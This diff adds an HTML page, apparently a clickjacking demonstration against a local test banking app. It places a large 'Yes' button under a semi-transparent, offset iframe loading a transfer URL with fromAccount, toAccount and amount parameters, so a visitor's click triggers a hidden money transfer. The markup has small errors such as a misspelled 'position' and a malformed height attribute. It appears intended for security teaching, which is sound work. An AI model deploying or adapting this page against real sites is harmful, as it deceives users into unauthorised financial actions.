@@ -1,0 +1,7 @@
+  <h1> Super safe and problem free landing page </h1>
+  <button style="padding: 20px; font-size: 2rem">Yes</button>
+  <iframe style="border: none; poition: absolute; top: -300px; opacity: 0.3; left: 120px; top: -330px;"
+          height-500 
+          src="http://localhost:3000/transfers?fromAccount=1&toAccount=2&amount=4">
+            
+  </iframe>
